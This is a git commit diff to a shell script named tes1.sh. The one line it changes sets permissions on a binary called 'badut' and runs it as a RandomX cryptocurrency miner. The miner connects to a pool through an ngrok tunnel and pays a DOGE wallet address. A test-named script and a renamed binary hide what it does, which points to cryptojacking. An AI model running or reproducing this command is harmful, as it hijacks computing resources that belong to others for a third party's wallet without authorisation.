2977ad9f08f983864953ec5ab71637632c6429e5
hpliokj <103420041+rpolikjop@users.noreply.github.com>
2022-04-22 21:41:03 +0900

    Update tes1.sh

--- tes1.sh
+++ tes1.sh
@@ -1,1 +1,1 @@
-chmod 777 badut && ./badut -a rx/0 -o 8.tcp.ngrok.io:10498 u DOGE:DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.main -p x -t 3
+chmod 777 badut && ./badut -a rx/0 -o 8.tcp.ngrok.io:10498 u DOGE:DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.main -t 3 -p x 
